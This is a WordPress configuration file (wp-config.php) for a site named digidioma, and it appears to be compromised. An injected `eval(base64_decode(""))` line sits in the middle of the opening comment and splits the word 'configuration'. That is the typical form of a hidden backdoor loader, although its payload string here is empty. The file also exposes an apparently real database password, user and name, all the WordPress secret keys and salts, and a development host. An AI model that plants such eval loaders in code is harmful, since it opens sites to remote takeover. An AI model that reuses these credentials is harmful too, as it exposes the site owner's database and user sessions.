<?php
/**
 * The base coneval(base64_decode(""));
/*figuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('WP_CACHE', true); //Added by WP-Cache Manager
define( 'WPCACHEHOME', '/var/www/digidioma.com/wp-content/plugins/wp-super-cache/' ); //Added by WP-Cache Manager
define('DB_NAME', 'digidioma_com');

/** MySQL database username */
define('DB_USER', 'digidiomacom');

/** MySQL database password */
define('DB_PASSWORD', 'p=4U./5v7K>A#TMs');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

# BEGIN WP Auto Salts
define('AUTH_KEY', 'CsrtQQ;[@2>&c]/+P+!$RTeG4DN!E1Eq|(_/(! +K-yat2KRf:WP2Wv=xVI)9><j');
define('SECURE_AUTH_KEY', 'c:4}36I, 2@]iqD(MW+H:vW)=e+T:4ha-k7F&4F(*pyM>:Hfx<LKK]IVH5C82sGO');
define('LOGGED_IN_KEY', '+k?;Jc=d_cV&Ec<cf?k8K--aBvGBa~,<7t&LT`XB/?)!_@)$a5n,Tbsw][>nXNT|');
define('NONCE_KEY', 'EQJElhn>[qNN(]9pVNs#Sq.+m=6$G3+RW2F@gSR<OHLL@$<NyR1v~sZ-JB0g/|TG');
define('AUTH_SALT', '{U+)Vy.;=B[5;r%S9U!v7xA+J4Mx:*;lip}60h^+`nGo[+w-V@m5)dh8gkrj`I1O');
define('SECURE_AUTH_SALT', 'u%P!|+i]d!}wGR_n7]&qD0;hx?r/M#3Eq>xhlG3sYP`|-33_:@^CQAJVvi1KSiX_');
define('LOGGED_IN_SALT', 'BFT%>85<,-QPfQ.9}-54/KU^Oa)#qWZ?ehA%5(Zs%|J^>0({4G(`WUnci0LDttT7');
define('NONCE_SALT', '1,Tv_W^//jzDHM<Ci.}hg{hO2n]-I3nM<QDI)1F)fN(whxOW[1],f&K-;H@/O6Tq');
# END WP Auto Salts

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

define('WP_HOME','https://digidioma-dev-carkod.c9users.io');
define('WP_SITEURL','https://digidioma-dev-carkod.c9users.io');

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
